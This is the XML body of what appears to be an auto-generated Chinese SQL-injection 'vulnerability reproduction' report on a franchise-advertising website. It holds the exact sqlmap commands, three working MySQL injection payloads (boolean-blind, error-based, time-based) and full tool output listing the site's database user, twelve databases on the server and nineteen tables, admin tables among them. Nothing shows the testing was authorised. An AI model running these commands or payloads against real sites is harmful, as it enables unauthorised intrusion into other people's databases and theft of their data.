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注入网址:http://www.laio8.com/jiamengs/824*.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">执行命令:python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : error-based</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : AND/OR time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:t>服务器语言 : PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>百度权重  2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://www.laio8.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">网站描述  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站标题  coco奶茶加盟多少钱|都可奶茶加盟|coco奶茶加盟网</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>IP__坐标  获取失败</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  获取失败</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  1年8月14天（创建于2017年08月18日,过期时间为2019年08月18日)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暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>协议类型  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">页面类型   -  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">服务类型   - </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">程序语言   - </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html --random-agent --dbs  --current-user --current-db --is-db </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>返回结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="XiaoLv"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        ___</w:t>
        <w:br/>
        <w:t xml:space="preserve">       __H__</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ___ ___[)]_____ ___ ___  {1.2.11.6#dev}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22:17:32 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:17:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1) Gecko/20061228 Firefox/2.0' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.2\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:t>custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</w:t>
        <w:br/>
        <w:t>[22:17:33] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>[22:17:33] [INFO] checking if the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:t>[22:17:33] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:t>do you want sqlmap to try to detect backend WAF/IPS? [y/N] N</w:t>
        <w:br/>
        <w:t>[22:17:33] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')</w:t>
        <w:br/>
        <w:t>[22:17:33] [INFO] testing if the target URL content is stable</w:t>
        <w:br/>
        <w:t>[22:17:34] [INFO] target URL content is stable</w:t>
        <w:br/>
        <w:t>[22:17:34] [INFO] testing if URI parameter '#1*' is dynamic</w:t>
        <w:br/>
        <w:t>[22:17:34] [WARNING] URI parameter '#1*' does not appear to be dynamic</w:t>
        <w:br/>
        <w:t>[22:17:35] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')</w:t>
        <w:br/>
        <w:t>[22:17:35] [INFO] testing for SQL injection on URI parameter '#1*'</w:t>
        <w:br/>
        <w:t>it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</w:t>
        <w:br/>
        <w:t>for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y</w:t>
        <w:br/>
        <w:t>[22:17:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</w:t>
        <w:br/>
        <w:t>[22:17:37] [WARNING] reflective value(s) found and filtering out</w:t>
        <w:br/>
        <w:t>[22:17:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'</w:t>
        <w:br/>
        <w:t>[22:17:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'</w:t>
        <w:br/>
        <w:t>[22:17:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'</w:t>
        <w:br/>
        <w:t>[22:18:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'</w:t>
        <w:br/>
        <w:t>[22:18:18] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'</w:t>
        <w:br/>
        <w:t>[22:18:19] [INFO] URI parameter '#1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --code=200)</w:t>
        <w:br/>
        <w:t>[22:18:19] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'</w:t>
        <w:br/>
        <w:t>[22:18:20] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'</w:t>
        <w:br/>
        <w:t>[22:18:20] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'</w:t>
        <w:br/>
        <w:t>[22:18:20] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'</w:t>
        <w:br/>
        <w:t>[22:18:21] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'</w:t>
        <w:br/>
        <w:t>[22:18:21] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'</w:t>
        <w:br/>
        <w:t>[22:18:21] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</w:t>
        <w:br/>
        <w:t xml:space="preserve">[22:18:22] [INFO] URI parameter '#1*' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable </w:t>
        <w:br/>
        <w:t>[22:18:22] [INFO] testing 'MySQL inline queries'</w:t>
        <w:br/>
        <w:t>[22:18:22] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (comment)'</w:t>
        <w:br/>
        <w:t>[22:18:22] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'</w:t>
        <w:br/>
        <w:t>[22:18:22] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP - comment)'</w:t>
        <w:br/>
        <w:t>[22:18:23] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP)'</w:t>
        <w:br/>
        <w:t>[22:18:23] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'</w:t>
        <w:br/>
        <w:t>[22:18:23] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'</w:t>
        <w:br/>
        <w:t>[22:18:24] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind'</w:t>
        <w:br/>
        <w:t xml:space="preserve">[22:18:44] [INFO] URI parameter '#1*' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind' injectable </w:t>
        <w:br/>
        <w:t>[22:18:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'</w:t>
        <w:br/>
        <w:t>[22:18:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'</w:t>
        <w:br/>
        <w:t>[22:18:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</w:t>
        <w:br/>
        <w:t>[22:18:51] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'</w:t>
        <w:br/>
        <w:t>[22:18:58] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'</w:t>
        <w:br/>
        <w:t>[22:19:04] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'</w:t>
        <w:br/>
        <w:t>[22:19:10] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'</w:t>
        <w:br/>
        <w:t>[22:19:16] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'</w:t>
        <w:br/>
        <w:t>[22:19:23] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'</w:t>
        <w:br/>
        <w:t>[22:19:29] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'</w:t>
        <w:br/>
        <w:t>[22:19:36] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'</w:t>
        <w:br/>
        <w:t>[22:19:42] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'</w:t>
        <w:br/>
        <w:t>URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</w:t>
        <w:br/>
        <w:t>sqlmap identified the following injection point(s) with a total of 359 HTTP(s) requests:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: #1* (URI)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: error-based</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: AND/OR time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[22:19:48] [INFO] the back-end DBMS is MySQL</w:t>
        <w:br/>
        <w:t>web application technology: PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:t>back-end DBMS: MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:t>[22:19:48] [INFO] fetching current user</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] retrieved: seozhan@localhost</w:t>
        <w:br/>
        <w:t>current user:    'seozhan@localhost'</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] fetching current database</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] retrieved: laio8_com</w:t>
        <w:br/>
        <w:t>current database:    'laio8_com'</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] testing if current user is DBA</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] fetching current user</w:t>
        <w:br/>
        <w:t>[22:19:50] [WARNING] potential permission problems detected ('command denied')</w:t>
        <w:br/>
        <w:t>current user is DBA:    False</w:t>
        <w:br/>
        <w:t>[22:19:50] [INFO] fetching database names</w:t>
        <w:br/>
        <w:t>[22:19:51] [INFO] used SQL query returns 12 entries</w:t>
        <w:br/>
        <w:t>[22:19:51] [INFO] retrieved: information_schema</w:t>
        <w:br/>
        <w:t>[22:19:51] [INFO] retrieved: baoshifumbgd_com</w:t>
        <w:br/>
        <w:t>[22:19:52] [INFO] retrieved: cocodukenc_com</w:t>
        <w:br/>
        <w:t>[22:19:52] [INFO] retrieved: dekeshihb_com</w:t>
        <w:br/>
        <w:t>[22:19:52] [INFO] retrieved: dhxbjm_com</w:t>
        <w:br/>
        <w:t>[22:19:53] [INFO] retrieved: joincyd_com</w:t>
        <w:br/>
        <w:t>[22:19:53] [INFO] retrieved: laio8_com</w:t>
        <w:br/>
        <w:t>[22:19:53] [INFO] retrieved: manjijmw_com</w:t>
        <w:br/>
        <w:t>[22:19:54] [INFO] retrieved: mingdingbz_com</w:t>
        <w:br/>
        <w:t>[22:19:54] [INFO] retrieved: test</w:t>
        <w:br/>
        <w:t>[22:19:54] [INFO] retrieved: yddncjm1_com</w:t>
        <w:br/>
        <w:t>[22:19:55] [INFO] retrieved: zbpizzagw_com</w:t>
        <w:br/>
        <w:t>available databases [12]:</w:t>
        <w:br/>
        <w:t>[*] baoshifumbgd_com</w:t>
        <w:br/>
        <w:t>[*] cocodukenc_com</w:t>
        <w:br/>
        <w:t>[*] dekeshihb_com</w:t>
        <w:br/>
        <w:t>[*] dhxbjm_com</w:t>
        <w:br/>
        <w:t>[*] information_schema</w:t>
        <w:br/>
        <w:t>[*] joincyd_com</w:t>
        <w:br/>
        <w:t>[*] laio8_com</w:t>
        <w:br/>
        <w:t>[*] manjijmw_com</w:t>
        <w:br/>
        <w:t>[*] mingdingbz_com</w:t>
        <w:br/>
        <w:t>[*] test</w:t>
        <w:br/>
        <w:t>[*] yddncjm1_com</w:t>
        <w:br/>
        <w:t>[*] zbpizzagw_com</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:19:55] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:t>500 (Internal Server Error) - 364 times, 404 (Not Found) - 1 times</w:t>
        <w:br/>
        <w:t>[22:19:55] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\www.laio8.com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 22:19:55 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>注入参数(方式) : #1* (URI)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : error-based</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : AND/OR time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>数据库类型 : MySQL</w:t>
        <w:br/>
        <w:t>服务器语言 : PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:t>数据库版本 : MySQL &gt;= 5.0</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前用户:    'seozhan@localhost'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库:    'laio8_com'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>是否有DBA权限:    False</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>所有数据库:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>[*] baoshifumbgd_com</w:t>
        <w:br/>
        <w:t>[*] cocodukenc_com</w:t>
        <w:br/>
        <w:t>[*] dekeshihb_com</w:t>
        <w:br/>
        <w:t>[*] dhxbjm_com</w:t>
        <w:br/>
        <w:t>[*] information_schema</w:t>
        <w:br/>
        <w:t>[*] joincyd_com</w:t>
        <w:br/>
        <w:t>[*] laio8_com</w:t>
        <w:br/>
        <w:t>[*] manjijmw_com</w:t>
        <w:br/>
        <w:t>[*] mingdingbz_com</w:t>
        <w:br/>
        <w:t>[*] test</w:t>
        <w:br/>
        <w:t>[*] yddncjm1_com</w:t>
        <w:br/>
        <w:t>[*] zbpizzagw_com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>执行命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">python sqlmap.py -u http://www.laio8.com/jiamengs/824*.html -D laio8_com --tables --random-agent </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>返回结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="XiaoLv"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        ___</w:t>
        <w:br/>
        <w:t xml:space="preserve">       __H__</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ___ ___[.]_____ ___ ___  {1.2.11.6#dev}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22:20:00 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:20:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.4) Gecko/2008111317 Linux Mint/5 (Elyssa) Firefox/3.0.4' from file 'C:\CODE\个人作品源代码\GET_SQL\ExtrAct-SQL_0.2\sqlmap\txt\user-agents.txt'</w:t>
        <w:br/>
        <w:t>custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</w:t>
        <w:br/>
        <w:t xml:space="preserve">[22:20:01] [INFO] resuming back-end DBMS 'mysql' </w:t>
        <w:br/>
        <w:t>[22:20:01] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>[22:20:01] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: #1* (URI)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) RLIKE (SELECT (CASE WHEN (6291=6291) THEN 824 ELSE 0x28 END))-- bakn.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: error-based</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(3829=3829,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eyqC.html</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    Type: AND/OR time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: MySQL &gt;= 5.0.12 AND time-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: http://www.laio8.com:80/jiamengs/824) AND SLEEP(5)-- tvgC.html</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[22:20:01] [INFO] the back-end DBMS is MySQL</w:t>
        <w:br/>
        <w:t>web application technology: PHP 5.4.45, Apache</w:t>
        <w:br/>
        <w:t>back-end DBMS: MySQL &gt;= 5.0</w:t>
        <w:br/>
        <w:t>[22:20:01] [INFO] fetching tables for database: 'laio8_com'</w:t>
        <w:br/>
        <w:t>[22:20:02] [WARNING] reflective value(s) found and filtering out</w:t>
        <w:br/>
        <w:t>[22:20:02] [INFO] used SQL query returns 19 entries</w:t>
        <w:br/>
        <w:t>[22:20:02] [INFO] retrieved: admin_login_log</w:t>
        <w:br/>
        <w:t>[22:20:02] [INFO] retrieved: cms_ad</w:t>
        <w:br/>
        <w:t>[22:20:03] [INFO] retrieved: cms_adflash</w:t>
        <w:br/>
        <w:t>[22:20:03] [INFO] retrieved: cms_admin</w:t>
        <w:br/>
        <w:t>[22:20:03] [INFO] retrieved: cms_adpos</w:t>
        <w:br/>
        <w:t>[22:20:04] [INFO] retrieved: cms_archives</w:t>
        <w:br/>
        <w:t>[22:20:04] [INFO] retrieved: cms_auth_group</w:t>
        <w:br/>
        <w:t>[22:20:04] [INFO] retrieved: cms_auth_group_access</w:t>
        <w:br/>
        <w:t>[22:20:05] [INFO] retrieved: cms_auth_rule</w:t>
        <w:br/>
        <w:t>[22:20:05] [INFO] retrieved: cms_bot</w:t>
        <w:br/>
        <w:t>[22:20:05] [INFO] retrieved: cms_cate</w:t>
        <w:br/>
        <w:t>[22:20:06] [INFO] retrieved: cms_conf</w:t>
        <w:br/>
        <w:t>[22:20:06] [INFO] retrieved: cms_html</w:t>
        <w:br/>
        <w:t>[22:20:06] [INFO] retrieved: cms_keywords</w:t>
        <w:br/>
        <w:t>[22:20:07] [INFO] retrieved: cms_link</w:t>
        <w:br/>
        <w:t>[22:20:07] [INFO] retrieved: cms_model</w:t>
        <w:br/>
        <w:t>[22:20:07] [INFO] retrieved: cms_model_fields</w:t>
        <w:br/>
        <w:t>[22:20:08] [INFO] retrieved: cms_note</w:t>
        <w:br/>
        <w:t>[22:20:08] [INFO] retrieved: cms_wenzhang</w:t>
        <w:br/>
        <w:t>Database: laio8_com</w:t>
        <w:br/>
        <w:t>[19 tables]</w:t>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:t>| admin_login_log       |</w:t>
        <w:br/>
        <w:t>| cms_ad                |</w:t>
        <w:br/>
        <w:t>| cms_adflash           |</w:t>
        <w:br/>
        <w:t>| cms_admin             |</w:t>
        <w:br/>
        <w:t>| cms_adpos             |</w:t>
        <w:br/>
        <w:t>| cms_archives          |</w:t>
        <w:br/>
        <w:t>| cms_auth_group        |</w:t>
        <w:br/>
        <w:t>| cms_auth_group_access |</w:t>
        <w:br/>
        <w:t>| cms_auth_rule         |</w:t>
        <w:br/>
        <w:t>| cms_bot               |</w:t>
        <w:br/>
        <w:t>| cms_cate              |</w:t>
        <w:br/>
        <w:t>| cms_conf              |</w:t>
        <w:br/>
        <w:t>| cms_html              |</w:t>
        <w:br/>
        <w:t>| cms_keywords          |</w:t>
        <w:br/>
        <w:t>| cms_link              |</w:t>
        <w:br/>
        <w:t>| cms_model             |</w:t>
        <w:br/>
        <w:t>| cms_model_fields      |</w:t>
        <w:br/>
        <w:t>| cms_note              |</w:t>
        <w:br/>
        <w:t>| cms_wenzhang          |</w:t>
        <w:br/>
        <w:t>+-----------------------+</w:t>
        <w:br/>
        <w:br/>
        <w:t>[22:20:08] [WARNING] HTTP error codes detected during run:</w:t>
        <w:br/>
        <w:t>500 (Internal Server Error) - 20 times</w:t>
        <w:br/>
        <w:t>[22:20:08] [INFO] fetched data logged to text files under 'C:\Users\langzi\.sqlmap\output\www.laio8.com'</w:t>
        <w:br/>
        <w:br/>
        <w:t>[*] ending @ 22:20:08 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="DaHei"/>
      </w:pPr>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>当前数据库下存在如下表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHOng"/>
      </w:pPr>
      <w:r>
        <w:t>Database: laio8_com</w:t>
        <w:br/>
        <w:t>[19 tables]</w:t>
        <w:br/>
